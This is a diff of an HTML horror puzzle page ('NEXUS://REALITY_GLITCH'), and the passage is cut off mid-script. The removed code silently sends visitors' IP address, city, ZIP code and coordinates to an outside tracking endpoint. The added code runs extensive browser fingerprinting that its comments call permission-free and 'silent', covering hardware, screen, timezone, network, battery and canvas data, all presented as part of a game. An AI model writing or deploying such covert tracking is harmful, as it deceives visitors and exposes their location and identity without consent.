@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>████████</title>
+    <title>🔮 NEXUS://REALITY_GLITCH</title>
     <style>
         * {
             margin: 0;
@@ -11,577 +11,1323 @@
             box-sizing: border-box;
         }
 
+        @keyframes corrupt {
+            0% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
+            10% { transform: translate(-10px, 10px) rotate(1deg); filter: hue-rotate(90deg) blur(2px); }
+            20% { transform: translate(10px, -10px) rotate(-1deg); filter: hue-rotate(180deg) blur(0px); }
+            30% { transform: translate(-5px, 5px) rotate(2deg); filter: hue-rotate(270deg) blur(3px); }
+            40% { transform: translate(5px, -5px) rotate(-2deg); filter: hue-rotate(360deg) blur(1px); }
+            50% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
+        }
+
         @keyframes flicker {
-            0% { opacity: 1; }
-            5% { opacity: 0.2; }
-            10% { opacity: 1; }
-            15% { opacity: 0.1; }
-            20% { opacity: 1; }
-            25% { opacity: 0.5; }
-            30% { opacity: 1; }
-        }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(2px, -2px); }
-            60% { transform: translate(-2px, -2px); }
-            80% { transform: translate(2px, 2px); }
-            100% { transform: translate(0); }
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.1; }
+            0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
-            100% { opacity: 0.1; }
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        @keyframes pulse-red {
+            0% { text-shadow: 0 0 5px #ff0000; }
+            50% { text-shadow: 0 0 30px #ff0000, 0 0 60px #8b0000; }
+            100% { text-shadow: 0 0 5px #ff0000; }
         }
 
         body {
             background: #000;
-            color: #333;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 0;
+            color: #0f0;
+            font-family: 'Courier New', 'VT323', monospace;
             min-height: 100vh;
-            cursor: crosshair;
+            position: relative;
             overflow-x: hidden;
+            cursor: crosshair;
+            margin: 0;
+            padding: 10px;
+            background-image: 
+                repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 2px),
+                repeating-linear-gradient(90deg, rgba(255,0,0,0.03) 0px, transparent 2px);
         }
 
-        /* Static overlay */
-        .static {
+        .terminal {
+            background: rgba(0,20,0,0.9);
+            border: 2px solid #0f0;
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+            padding: 20px;
+            margin: 20px;
+            position: relative;
+            backdrop-filter: blur(2px);
+        }
+
+        .terminal::before {
+            content: ">";
+            position: absolute;
+            left: -15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #0f0;
+            font-size: 24px;
+            animation: pulse-red 1s infinite;
+        }
+
+        .glitch-text {
+            font-size: clamp(1.2rem, 3vw, 2rem);
+            color: #0f0;
+            text-shadow: 
+                2px 2px 0 #ff0000,
+                -2px -2px 0 #0000ff;
+            animation: corrupt 5s infinite;
+            margin-bottom: 20px;
+        }
+
+        .data-stream {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #0f0;
+            line-height: 12px;
+            opacity: 0.5;
+            white-space: pre;
+            overflow: hidden;
+            height: 100px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .matrix-rain {
             position: fixed;
             top: 0;
             left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+            z-index: 9998;
+            opacity: 0.1;
+        }
+
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            padding: 20px;
+            max-width: 2000px;
+            margin: 0 auto;
+        }
+
+        .puzzle-card {
+            background: rgba(0,30,0,0.95);
+            border: 3px solid #0f0;
+            padding: 20px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            min-height: 300px;
+            box-shadow: 0 0 50px rgba(0,255,0,0.2);
+        }
+
+        .puzzle-card:hover {
+            transform: scale(1.02);
+            border-color: #ff0000;
+            box-shadow: 0 0 80px rgba(255,0,0,0.4);
+        }
+
+        .puzzle-card::after {
+            content: "";
+            position: absolute;
+            top: -100%;
+            left: 0;
             width: 100%;
             height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.8) 0px, rgba(255,255,255,0.02) 2px, rgba(0,0,0,0.8) 4px);
+            background: linear-gradient(transparent, rgba(0,255,0,0.1));
+            animation: scan 3s linear infinite;
             pointer-events: none;
-            z-index: 1;
-            opacity: 0.1;
-            animation: flicker 8s infinite;
         }
 
-        /* Main container */
-        .container {
-            position: relative;
-            z-index: 2;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 40px 20px;
-        }
-
-        /* Header */
-        .header {
-            text-align: center;
-            margin-bottom: 60px;
-            border: 1px solid #1a0000;
-            padding: 30px;
-            position: relative;
-        }
-
-        .header h1 {
-            color: #1a0000;
+        .card-header {
             font-size: 1.5rem;
-            letter-spacing: 4px;
-            font-weight: normal;
-            animation: flicker 10s infinite;
-        }
-
-        .header .line {
-            width: 100%;
-            height: 1px;
-            background: #1a0000;
-            margin: 20px 0;
-        }
-
-        /* Data strip */
-        .data-strip {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.7rem;
-            color: #1a0000;
-            margin-bottom: 40px;
-            border-bottom: 1px solid #1a0000;
+            color: #0f0;
+            border-bottom: 2px dashed #0f0;
             padding-bottom: 10px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
         }
 
-        /* Progress */
-        .progress {
-            text-align: center;
-            margin: 40px 0;
-            font-size: 0.8rem;
-            color: #220000;
+        .btn {
+            background: #000;
+            color: #0f0;
+            border: 3px solid #0f0;
+            padding: 15px 25px;
+            font-size: 1.2rem;
+            font-family: 'Courier New', monospace;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin: 10px 0;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
             letter-spacing: 2px;
         }
 
-        .progress-bar {
-            width: 100%;
-            height: 1px;
-            background: #1a0000;
-            margin: 10px 0;
-            position: relative;
+        .btn:hover {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 50px #0f0;
+            transform: scale(1.05);
         }
 
-        .progress-fill {
-            height: 1px;
-            width: 0%;
-            background: #330000;
-            transition: width 0.3s;
+        .btn.danger:hover {
+            background: #ff0000;
+            border-color: #ff0000;
+            box-shadow: 0 0 50px #ff0000;
         }
 
-        /* Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 1px;
-            background: #1a0000;
-            border: 1px solid #1a0000;
-            margin: 40px 0;
-        }
-
-        /* Cell */
-        .cell {
-            aspect-ratio: 1;
+        .data-panel {
             background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #220000;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: all 0.5s;
+            border: 2px solid #0f0;
+            padding: 15px;
+            font-size: 0.9rem;
+            max-height: 250px;
+            overflow-y: auto;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .location-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .coord-display {
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 10px;
+            text-align: center;
+            font-size: 1.5rem;
+            animation: flicker 2s infinite;
+        }
+
+        .camera-feed-container {
+            width: 100%;
+            height: 200px;
+            border: 4px solid #0f0;
             position: relative;
+            overflow: hidden;
+            margin: 15px 0;
+            background: #000;
         }
 
-        .cell:hover {
-            background: #0a0000;
-            color: #330000;
+        .camera-feed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: grayscale(1) contrast(1.5);
+            transition: all 0.3s;
         }
 
-        .cell.found {
-            color: #330000;
-            animation: glitch 0.3s;
-        }
-
-        .cell.found::after {
-            content: '';
+        .feed-overlay {
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            border: 1px solid #330000;
-            opacity: 0.3;
+            background: linear-gradient(transparent 50%, rgba(0,255,0,0.1) 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 2;
         }
 
-        /* Modal */
-        .modal {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #000;
-            border: 1px solid #330000;
-            padding: 40px;
-            max-width: 400px;
-            width: 90%;
-            z-index: 1000;
-            display: none;
-            box-shadow: 0 0 100px rgba(51,0,0,0.3);
-        }
-
-        .modal.active {
-            display: block;
-            animation: flicker 0.5s;
-        }
-
-        .modal .title {
-            color: #330000;
-            margin-bottom: 20px;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-        }
-
-        .modal .content {
-            color: #442222;
+        .feed-info {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            padding: 5px 10px;
+            border: 2px solid #0f0;
+            color: #0f0;
             font-size: 0.8rem;
-            line-height: 1.6;
-            margin-bottom: 30px;
+            z-index: 3;
         }
 
-        .modal .close {
-            color: #1a0000;
-            cursor: pointer;
-            font-size: 0.7rem;
-            text-align: right;
-            border-top: 1px solid #1a0000;
-            padding-top: 15px;
-        }
-
-        .modal .close:hover {
-            color: #330000;
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            margin-top: 60px;
-            padding: 20px;
-            border-top: 1px solid #1a0000;
-            font-size: 0.6rem;
-            color: #220000;
-            letter-spacing: 1px;
-        }
-
-        /* Hidden elements */
-        .hidden {
-            display: none;
-        }
-
-        /* Threat indicator */
-        .threat {
+        .threat-indicator {
             position: fixed;
             top: 20px;
             right: 20px;
-            width: 3px;
-            height: 3px;
-            background: #330000;
+            width: 200px;
+            height: 200px;
+            border: 4px solid #0f0;
             border-radius: 50%;
-            animation: pulse 3s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            animation: pulse-red 2s infinite;
         }
 
-        /* Timestamp */
-        .timestamp {
+        .threat-number {
+            font-size: 3rem;
+            color: #ff0000;
+        }
+
+        .timeline {
             position: fixed;
             bottom: 20px;
+            left: 20px;
             right: 20px;
-            font-size: 0.5rem;
-            color: #1a0000;
+            height: 5px;
+            background: #0f0;
+            z-index: 9999;
+        }
+
+        .timeline-progress {
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+            transition: width 1s;
+        }
+
+        .hidden-message {
+            color: #000;
+            background: #000;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .hidden-message:hover {
+            color: #0f0;
+            background: transparent;
+        }
+
+        .puzzle-piece {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 2px solid #0f0;
+            margin: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .puzzle-piece.found {
+            background: #0f0;
+            box-shadow: 0 0 30px #0f0;
+        }
+
+        .qr-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .qr-code {
+            width: 100px;
+            height: 100px;
+            background: repeating-linear-gradient(45deg, #000 0px, #000 10px, #0f0 10px, #0f0 20px);
+            border: 2px solid #0f0;
+        }
+
+        .timeline-event {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #0f0;
+            font-size: 0.8rem;
+            white-space: nowrap;
         }
     </style>
 </head>
 <body>
-    <div class="static"></div>
-    <div class="threat" id="threat"></div>
-    <div class="timestamp" id="timestamp">--:--:--</div>
+    <!-- Matrix rain background -->
+    <canvas id="matrixCanvas" class="matrix-rain"></canvas>
+    
+    <!-- Threat indicator -->
+    <div class="threat-indicator">
+        <div>THREAT LEVEL</div>
+        <div class="threat-number" id="threatLevel">0</div>
+        <div id="threatMessage">SCANNING</div>
+    </div>
 
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <h1 id="glitch">[   H O L L O W   ]</h1>
-            <div class="line"></div>
-            <div style="color: #1a0000; font-size: 0.7rem;">case file #447</div>
-        </div>
+    <!-- Timeline -->
+    <div class="timeline">
+        <div class="timeline-progress" id="timelineProgress"></div>
+        <div class="timeline-event" id="timelineEvent">INITIALIZING...</div>
+    </div>
 
-        <!-- Data strip -->
-        <div class="data-strip">
-            <span id="ip">--.--.--.--</span>
-            <span id="location">------</span>
-            <span id="zip">-----</span>
-        </div>
+    <!-- Data stream -->
+    <div class="data-stream" id="dataStream"></div>
 
-        <!-- Progress -->
-        <div class="progress">
-            <div>fragments recovered: <span id="count">0</span>/20</div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
+    <!-- Main header -->
+    <div class="terminal" style="margin: 10px;">
+        <div class="glitch-text" id="mainHeader">> REALITY_GLITCH.exe // NEXUS v2.3.3.7</div>
+        <div id="systemTime" style="color: #0f0; font-size: 0.9rem;"></div>
+        <div id="coordinates" style="color: #0f0; font-size: 0.9rem;"></div>
+    </div>
+
+    <!-- Main puzzle grid -->
+    <div class="grid-container">
+        <!-- GEOLOCATION NEXUS -->
+        <div class="puzzle-card">
+            <div class="card-header">🌍 GEOLOCATION NEXUS</div>
+            <div class="location-grid">
+                <div class="coord-display" id="latitude">--.----</div>
+                <div class="coord-display" id="longitude">--.----</div>
             </div>
+            <div id="address" class="data-panel">Acquiring location data...</div>
+            <div id="nearbyPlaces" class="data-panel" style="max-height: 150px;"></div>
+            <button class="btn" id="forceLocation">🔍 FORCE SCAN</button>
         </div>
 
-        <!-- Grid -->
-        <div class="grid" id="grid"></div>
+        <!-- SURVEILLANCE MATRIX -->
+        <div class="puzzle-card">
+            <div class="card-header">📡 SURVEILLANCE MATRIX</div>
+            <div class="camera-feed-container" id="cameraFeedContainer">
+                <img id="activeCameraFeed" class="camera-feed" src="" alt="Feed">
+                <div class="feed-overlay"></div>
+                <div class="feed-info" id="cameraInfo">No feed</div>
+            </div>
+            <div id="cameraList" class="data-panel" style="max-height: 150px;"></div>
+            <button class="btn" id="scanCameras">🎥 SCAN NETWORK</button>
+            <button class="btn" id="nextCamera">⏭️ NEXT FEED</button>
+        </div>
 
-        <!-- Footer -->
-        <div class="footer">
-            <div id="message">* they are watching *</div>
+        <!-- SYSTEM FINGERPRINT -->
+        <div class="puzzle-card">
+            <div class="card-header">💻 SYSTEM FINGERPRINT</div>
+            <div id="sysInfo" class="data-panel"></div>
+            <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
+            <div id="hardwareInfo" class="data-panel" style="display: none;"></div>
+        </div>
+
+        <!-- THE BUTTON (DO NOT PRESS) -->
+        <div class="puzzle-card">
+            <div class="card-header">🚫 [REDACTED]</div>
+            <button class="btn danger" id="forbiddenButton">!!! DO NOT PRESS !!!</button>
+            <div id="pressHistory" class="data-panel"></div>
+            <div id="buttonMessages" class="data-panel" style="color: #ff0000;"></div>
+        </div>
+
+        <!-- AUDIO FREQUENCY ANALYZER -->
+        <div class="puzzle-card">
+            <div class="card-header">🎵 AUDIO FREQUENCIES</div>
+            <canvas id="audioVisualizer" width="300" height="100" style="width:100%; height:100px; border:2px solid #0f0; margin:10px 0;"></canvas>
+            <button class="btn" id="playFrequency">🔊 TRANSMIT</button>
+            <input type="range" id="frequencySlider" min="20" max="2000" value="440" style="width:100%; margin:10px 0;">
+            <div id="audioMessage" class="data-panel"></div>
+        </div>
+
+        <!-- NAME RITUAL -->
+        <div class="puzzle-card">
+            <div class="card-header">📝 NAME RITUAL</div>
+            <input type="text" id="ritualName" class="data-panel" placeholder="Enter name..." style="width:100%;">
+            <button class="btn" id="summonName">🔮 SUMMON</button>
+            <div id="nameResult" class="data-panel"></div>
+            <div id="nameHistory" class="data-panel" style="max-height: 100px;"></div>
+        </div>
+
+        <!-- ARCHIVE FOOTAGE -->
+        <div class="puzzle-card">
+            <div class="card-header">🏛️ ARCHIVE FOOTAGE</div>
+            <video id="archiveVideo" autoplay playsinline muted style="width:100%; height:150px; border:2px solid #0f0;"></video>
+            <div id="archiveLabel" class="data-panel">Loading...</div>
+            <button class="btn" id="nextArchive">🔄 NEXT FRAME</button>
+            <button class="btn" id="recordArchive">⏺️ RECORD</button>
+        </div>
+
+        <!-- QUANTUM RANDOMIZER -->
+        <div class="puzzle-card">
+            <div class="card-header">🌀 QUANTUM RANDOMIZER</div>
+            <div id="randomNumbers" class="data-panel">-- -- -- -- --</div>
+            <button class="btn" id="generateRandom">🎲 GENERATE</button>
+            <div id="quantumMessage" class="data-panel"></div>
+        </div>
+
+        <!-- CIPHER DECODER -->
+        <div class="puzzle-card">
+            <div class="card-header">🔐 CIPHER DECODER</div>
+            <textarea id="cipherInput" class="data-panel" placeholder="Enter cipher..." rows="2"></textarea>
+            <button class="btn" id="decodeCipher">🔓 DECODE</button>
+            <div id="cipherOutput" class="data-panel"></div>
+        </div>
+
+        <!-- TIMELINE ANOMALIES -->
+        <div class="puzzle-card">
+            <div class="card-header">⏳ TIMELINE ANOMALIES</div>
+            <div id="timelineEvents" class="data-panel"></div>
+            <button class="btn" id="scanTimeline">📅 SCAN TIMELINE</button>
+        </div>
+
+        <!-- COLLECTIBLES / PUZZLE PIECES -->
+        <div class="puzzle-card">
+            <div class="card-header">🧩 REALITY FRAGMENTS</div>
+            <div id="puzzlePieces" class="qr-container"></div>
+            <div id="fragmentsFound">0/9 fragments collected</div>
+        </div>
+
+        <!-- DEEP WEB NEXUS -->
+        <div class="puzzle-card">
+            <div class="card-header">🌐 DEEP WEB NEXUS</div>
+            <button class="btn" id="scrapeDarkWeb">💀 SCRAPE</button>
+            <div id="darkWebData" class="data-panel"></div>
+        </div>
+
+        <!-- CONSPIRACY GENERATOR -->
+        <div class="puzzle-card">
+            <div class="card-header">👁️ CONSPIRACY GENERATOR</div>
+            <button class="btn" id="generateTheory">🤔 GENERATE</button>
+            <div id="conspiracyText" class="data-panel"></div>
+        </div>
+
+        <!-- SATELLITE IMAGERY -->
+        <div class="puzzle-card">
+            <div class="card-header">🛰️ SATELLITE IMAGERY</div>
+            <img id="satelliteImage" class="camera-feed" src="" alt="Satellite" style="height:150px;">
+            <button class="btn" id="refreshSatellite">🔄 REFRESH</button>
+        </div>
+
+        <!-- ENCRYPTED MESSAGES -->
+        <div class="puzzle-card">
+            <div class="card-header">📨 ENCRYPTED MESSAGES</div>
+            <div id="encryptedMessages" class="data-panel"></div>
+            <button class="btn" id="newMessage">📩 RECEIVE</button>
         </div>
     </div>
 
-    <!-- Modal -->
-    <div class="modal" id="modal">
-        <div class="title" id="modalTitle"></div>
-        <div class="content" id="modalContent"></div>
-        <div class="close" onclick="closeModal()">[ close ]</div>
+    <!-- Hidden footer with secrets -->
+    <div class="terminal" style="margin-top: 50px;">
+        <div style="text-align: center; color: #0f0; opacity: 0.5;" id="footerText">
+            > SYSTEM STATUS: [ACTIVE] // USERS ONLINE: <span id="onlineUsers">0000</span> // ENCRYPTION: [AES-256]
+        </div>
+        <div class="hidden-message" onclick="revealSecret(1)">[CLICK HERE FOR SECRET MESSAGE]</div>
     </div>
 
     <script>
-        // ==================== DATA COLLECTION ====================
-        async function collectData() {
-            try {
-                // Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                document.getElementById('ip').textContent = ipData.ip || '??.??.??.??';
-                
-                // Get location
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const geoData = await geoRes.json();
-                if (geoData.city) {
-                    document.getElementById('location').textContent = geoData.city;
-                    document.getElementById('zip').textContent = geoData.postal || '?????';
-                    
-                    // Send to backend
-                    sendToBackend('location', {
-                        ip: ipData.ip,
-                        city: geoData.city,
-                        state: geoData.region,
-                        zip: geoData.postal,
-                        lat: geoData.latitude,
-                        lon: geoData.longitude
-                    });
-                }
-            } catch(e) {}
-        }
-        collectData();
+        // ==================== ADVANCED DATA COLLECTION (NO PERMISSIONS NEEDED) ====================
+        let collectedData = {
+            ip: null,
+            location: null,
+            browser: null,
+            system: null,
+            network: null,
+            hardware: null,
+            canvas: null,
+            webgl: null,
+            fonts: null,
+            plugins: null,
+            timezone: null,
+            language: null,
+            screen: null,
+            battery: null,
+            connection: null,
+            memory: null,
+            cores: null,
+            touchPoints: null,
+            cookies: null,
+            doNotTrack: null,
+            hardwareConcurrency: null,
+            deviceMemory: null,
+            maxTouchPoints: null,
+            vendor: null,
+            platform: null,
+            userAgent: null,
+            appVersion: null,
+            appName: null,
+            appCodeName: null,
+            product: null,
+            productSub: null,
+            vendorSub: null,
+            mimeTypes: null,
+            pdfViewerEnabled: null,
+            webdriver: null,
+            languages: null,
+            cookieEnabled: null,
+            onLine: null,
+            referrer: null,
+            historyLength: null,
+            localStorage: null,
+            sessionStorage: null,
+            indexedDB: null,
+            openDatabase: null,
+            cpuClass: null,
+            oscpu: null,
+            buildID: null,
+            mozSettings: null,
+            contry: null,
+            region: null,
+            city: null,
+            postal: null,
+            timezoneOffset: null,
+            dstOffset: null,
+            networkType: null,
+            networkSpeed: null,
+            networkRTT: null,
+            networkDownlink: null,
+            networkSaveData: null,
+            deviceOrientation: null,
+            devicePixelRatio: null,
+            colorDepth: null,
+            pixelDepth: null,
+            availWidth: null,
+            availHeight: null,
+            width: null,
+            height: null,
+            outerWidth: null,
+            outerHeight: null,
+            innerWidth: null,
+            innerHeight: null,
+            screenX: null,
+            screenY: null,
+            screenLeft: null,
+            screenTop: null
+        };
 
-        // Update timestamp
-        function updateTimestamp() {
-            const now = new Date();
-            document.getElementById('timestamp').textContent = 
-                `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
-        }
-        setInterval(updateTimestamp, 1000);
-        updateTimestamp();
+        // Puzzle system
+        let puzzlePieces = 0;
+        let buttonPresses = 0;
+        let timelineEvents = [];
+        let collectedNames = [];
+        let cameraIndex = 0;
+        let archiveIndex = 0;
+        let threatLevel = 0;
+        let secretMessages = [];
 
-        // ==================== BACKEND INTEGRATION ====================
-        async function sendToBackend(type, data) {
+        // ==================== AUTO DATA COLLECTION ====================
+        async function collectAllData() {
+            // Basic browser data
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.platform = navigator.platform;
+            collectedData.language = navigator.language;
+            collectedData.languages = navigator.languages.join(', ');
+            collectedData.cookieEnabled = navigator.cookieEnabled;
+            collectedData.doNotTrack = navigator.doNotTrack;
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
+            collectedData.deviceMemory = navigator.deviceMemory;
+            collectedData.maxTouchPoints = navigator.maxTouchPoints;
+            collectedData.vendor = navigator.vendor;
+            collectedData.appVersion = navigator.appVersion;
+            collectedData.appName = navigator.appName;
+            collectedData.appCodeName = navigator.appCodeName;
+            collectedData.product = navigator.product;
+            collectedData.productSub = navigator.productSub;
+            collectedData.vendorSub = navigator.vendorSub;
+            collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
+            collectedData.webdriver = navigator.webdriver;
+            collectedData.onLine = navigator.onLine;
+            collectedData.referrer = document.referrer;
+            collectedData.historyLength = history.length;
+
+            // Screen data
+            collectedData.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type
+            };
+
+            // Window data
+            collectedData.window = {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                screenX: window.screenX,
+                screenY: window.screenY
+            };
+
+            // Timezone
+            collectedData.timezone = {
+                zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: new Date().getTimezoneOffset(),
+                timestamp: Date.now(),
+                date: new Date().toString()
+            };
+
+            // Storage check
             try {
-                await fetch('https://b-n1nt.onrender.com/api/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type, data })
+                localStorage.setItem('test', 'test');
+                collectedData.localStorage = true;
+                localStorage.removeItem('test');
+            } catch {
+                collectedData.localStorage = false;
+            }
+
+            try {
+                sessionStorage.setItem('test', 'test');
+                collectedData.sessionStorage = true;
+                sessionStorage.removeItem('test');
+            } catch {
+                collectedData.sessionStorage = false;
+            }
+
+            // Network info
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                collectedData.network = {
+                    type: conn.effectiveType,
+                    rtt: conn.rtt,
+                    downlink: conn.downlink,
+                    saveData: conn.saveData
+                };
+            }
+
+            // Battery info (silent)
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    collectedData.battery = {
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
                 });
-            } catch(e) {}
-        }
+            }
 
-        // ==================== PUZZLE FRAGMENTS ====================
-        const fragments = [
-            // DOOR (0-3)
-            { id: 0, title: "DOOR/1", content: "It appeared on the third floor. Not there yesterday. Knocking from inside. Room sealed 40 years. The janitor heard whispers." },
-            { id: 1, title: "DOOR/2", content: "The handle was warm. Like someone held it from the other side. Breathing through the wood. It knows I'm here." },
-            { id: 2, title: "DOOR/3", content: "Came back with crowbar. Door gone. Just wall. Janitor quit that day. Didn't say why. His eyes were empty." },
-            { id: 3, title: "DOOR/4", content: "Reappeared in my bedroom. I sleep in living room now. It opens at 3am. Something comes through." },
-            
-            // TAPE (4-6)
-            { id: 4, title: "TAPE/1", content: "In my mailbox. 'WATCH ME' in red. Shows my house from outside. Date is tomorrow. I'm already dead." },
-            { id: 5, title: "TAPE/2", content: "Someone watching through my window. Recording me watch them. Infinite loop. Can't look away." },
-            { id: 6, title: "TAPE/3", content: "Burned it. Reappeared in VCR. Face in static. Getting closer each play. Now it's at the screen." },
-            
-            // KEY (7-9)
-            { id: 7, title: "KEY/1", content: "Doesn't fit any lock. Found door in woods. It fit. Didn't open it. Something was waiting." },
-            { id: 8, title: "KEY/2", content: "Warm. Pulses like heartbeat. Dreamed of a room. Woke up holding something from dream. A photograph." },
-            { id: 9, title: "KEY/3", content: "Twelve keys now. Appeared overnight. They spell words when arranged. 'RUN' they said. I didn't listen." },
-            
-            // CAMERA (10-11)
-            { id: 10, title: "CAMERA/1", content: "Photos show things not there. Selfie had figure behind me. I was alone. It's getting closer in each photo." },
-            { id: 11, title: "CAMERA/2", content: "Same figure in every photo. Threw camera away. It took photo of trash can. Figure there. It's always there." },
-            
-            // PHONE (12-13)
-            { id: 12, title: "PHONE/1", content: "Rings at 3am. My own voice. 'Don't sleep' it said. Calls from inside house. From the basement." },
-            { id: 13, title: "PHONE/2", content: "Unplugged. Still rings. From walls. 100 calls in one minute. Different voices. All say my name. All know me." },
-            
-            // DIARY (14-15)
-            { id: 14, title: "DIARY/1", content: "In attic. My handwriting. Never wrote it. Last entry: 'today they come'. Today is today. They're here." },
-            { id: 15, title: "DIARY/2", content: "Wrote in it. Ink disappeared. Words appeared: 'stop writing'. Burned it. Ashes formed words. 'too late'." },
-            
-            // CLOCK (16-17)
-            { id: 16, title: "CLOCK/1", content: "Ticks backwards. Getting younger. Stopped at 3:33. Sun hasn't moved in 3 days. Time is broken." },
-            { id: 17, title: "CLOCK/2", content: "Chimes 13 times. Something happens on 13th. Smashed it. Pieces tick different times. All wrong. All dying." },
-            
-            // LIGHT (18)
-            { id: 18, title: "LIGHT/1", content: "Won't turn off. Getting brighter. Speaks. Shows shapes. They move closer. They're at the door now." },
-            
-            // BLOOD (19)
-            { id: 19, title: "BLOOD/1", content: "In sink. On walls. Writes words. Knows my name. Cut myself. Blood wasn't mine. It was yours." },
-            
-            // EYE (20)
-            { id: 20, title: "EYE/1", content: "In mirror. Behind me. Every reflection. Every screen. Blinked. Time stopped. It's still watching. Reading this." }
-        ];
+            // Canvas fingerprinting (silent)
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 200;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Hello, world!', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Hello, world!', 4, 17);
+                collectedData.canvas = canvas.toDataURL();
+            } catch (e) {
+                collectedData.canvas = 'error';
+            }
 
-        // State
-        let found = JSON.parse(localStorage.getItem('hollow_found')) || [];
-        let messages = [
-            "they are watching",
-            "the door is open",
-            "it knows your name",
-            "don't look back",
-            "run",
-            "too late",
-            "behind you",
-            "the tape is playing",
-            "the key fits",
-            "the photo moves",
-            "the phone rings",
-            "the diary writes itself",
-            "the clock stops",
-            "the light burns",
-            "the blood writes",
-            "the eye sees you"
-        ];
-
-        // ==================== GRID SETUP ====================
-        function createGrid() {
-            const grid = document.getElementById('grid');
-            grid.innerHTML = '';
-
-            // Create 20 cells (4x5 grid)
-            for (let i = 0; i < 20; i++) {
-                const cell = document.createElement('div');
-                cell.className = 'cell';
-                
-                // Find fragment for this cell
-                const fragment = fragments.find(f => f.id === i);
-                
-                if (found.includes(i)) {
-                    cell.classList.add('found');
-                    cell.textContent = '▪';
-                } else {
-                    cell.textContent = '□';
+            // WebGL fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
